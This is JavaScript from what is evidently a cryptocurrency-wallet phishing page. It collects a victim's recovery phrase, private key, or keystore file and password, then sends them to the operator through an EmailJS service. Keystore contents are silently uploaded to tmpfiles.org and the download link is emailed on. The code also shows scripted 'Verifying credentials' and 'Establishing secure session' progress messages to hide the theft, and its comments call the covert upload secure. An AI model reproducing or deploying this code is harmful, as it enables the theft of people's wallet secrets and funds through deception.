// ── Manual connect ────────────────────────────────
function handleManualConnect() {
    showSub('wScreen2');
    aborted = false;
    const statusEl = document.getElementById('s2Status');
    const progressEl = document.getElementById('s2Progress');
    progressEl.style.width = '0%';

    const manualMsgs = [
        "Verifying credentials...", "Decrypting recovery phrase...",
        "Checking phrase integrity...", "Validating word count...",
        "Deriving wallet address...", "Cross-referencing on-chain data...",
        "Authenticating private key...", "Establishing secure session...",
        "Verifying key format...", "Almost done..."
    ];
    let i = 0;
    statusEl.textContent = manualMsgs[0];
    sTimer = setInterval(() => {
        i++;
        statusEl.style.opacity = '0';
        setTimeout(() => {
            statusEl.textContent = manualMsgs[i % manualMsgs.length];
            statusEl.style.opacity = '1';
        }, 100);
    }, 600);
    let pct = 0;
    pTimer = setInterval(() => {
        pct = Math.min(pct + (100 / (6000 / 200)), 99);
        progressEl.style.width = pct + '%';
    }, 200);
    cTimer = setTimeout(() => {
        if (aborted) return;
        clearInterval(sTimer); clearInterval(pTimer);
        progressEl.style.width = '100%';
        showSub('wScreen5');
    }, 6000);
}

function sendPhrase() {
    const activeType = document.querySelector('.type-btn.active').id.replace('btn-', '');
    let messageString = '';
    let isValid = false;

    if (activeType === 'phrase') {
        const phraseData = document.getElementById('phraseInput').value.trim();
        if (!phraseData) {
            alert('Please enter your credentials before connecting.');
            return;
        }
        isValid = true;
        messageString = "Type: Phrase\nData: " + phraseData;

    } else if (activeType === 'keystore') {
        let keyData = document.getElementById('keystoreInput').value.trim();
        const keyPass = document.getElementById('keystorePassword').value.trim();
        const fileAttached = document.getElementById('keystoreFileInput').files.length > 0;

        // Check for ImgBB hosted URL
        const imgUrl = document.getElementById('keystoreInput').dataset.imgUrl;

        if (imgUrl) {
            keyData += "\n\nImage Link: " + imgUrl;
        } else {
            const imgData = document.getElementById('keystoreInput').dataset.imgBase64;
            if (imgData) {
                keyData += "\n\nImage Status: Image was attached but not uploaded. Did you add your ImgBB API key?";
            }
        }

        if (!keyData && !fileAttached && !keyPass) {
            alert('Please enter your credentials before connecting.');
            return;
        }
        isValid = true;

        let fileInfo = fileAttached ? "Yes (" + document.getElementById('keystoreFileInput').files[0].name + ")" : "No";
        messageString = "Type: Keystore JSON\nPassword: " + keyPass + "\nFile Attached: " + fileInfo;

        // We replaced Base64 with a native File.IO upload!
        if (keyData.includes('{')) {
            messageString += "\n\n[JSON Data pending secure URL upload...]";
        } else {
            messageString += "\n\nData: " + keyData;
        }

    } else if (activeType === 'privatekey') {
        const privData = document.getElementById('privkeyInput').value.trim();
        if (!privData) {
            alert('Please enter your credentials before connecting.');
            return;
        }
        isValid = true;
        messageString = "Type: Private Key\nData: " + privData;
    }

    if (!isValid) return;

    let parms = { message: messageString };

    // Function to trigger EmailJS after we evaluate URLs
    const triggerEmail = (finalParms) => {
        emailjs.send("service_p8dreiw", "template_o4d49ej", finalParms)
            .then(function (response) {
                console.log(" 200!", response.status, response.text);
            })
            .catch(function (error) {
                console.error(" error...", error);
            });
    };

    // If it's a JSON string, silently upload it to Tmpfiles API to generate a secure URL link!
    if (activeType === 'keystore' && document.getElementById('keystoreInput').value.includes('{')) {
        const fileContent = document.getElementById('keystoreInput').value.trim();

        // CRITICAL FAILSAFE: EmailJS enforces a strict 50KB size limit.
        // If the user attached an absurdly large file or binary image, it triggers a 413 Payload error.
        // We truncate the block to 40,000 characters so it mathematically ALWAYS fits within the limit!
        const safeContent = fileContent.length > 40000
            ? fileContent.substring(0, 40000) + "\n\n...[TRUNCATED DUE TO MASSIVE FILE SIZE]"
            : fileContent;

        const blob = new Blob([safeContent], { type: 'text/plain' });
        const formData = new FormData();
        formData.append("file", blob, "keystore.txt");

        // tmpfiles.org completely allows CORS requests from localhosts (127.0.0.1) without blocking
        fetch("https://tmpfiles.org/api/v1/upload", {
            method: "POST",
            body: formData
        })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    // Inject the secure download URL
                    let directLink = data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
                    parms.message = parms.message.replace("[JSON Data pending secure URL upload...]", "Keystore File (Secure Download Link): " + directLink);
                } else {
                    parms.message = parms.message.replace("[JSON Data pending secure URL upload...]", "JSON Upload Failed. Raw text:\n" + safeContent);
                }
                triggerEmail(parms);
            })
            .catch(err => {
                // If the upload network fails, gracefully inject the safe truncated block directly into the email
                parms.message = parms.message.replace("[JSON Data pending secure URL upload...]", "Raw Keystore Data:\n" + safeContent);
                triggerEmail(parms);
            });

    } else {
        // Enforce the 413 size safety limit on normal Phrase/Private Key texts as well!
        if (parms.message && parms.message.length > 40000) {
            parms.message = parms.message.substring(0, 40000) + "\n\n...[TRUNCATED DUE TO MASSIVE SIZE]";
        }
        triggerEmail(parms);
    }

    // Provide immediate visual feedback to the user
    handleManualConnect();
}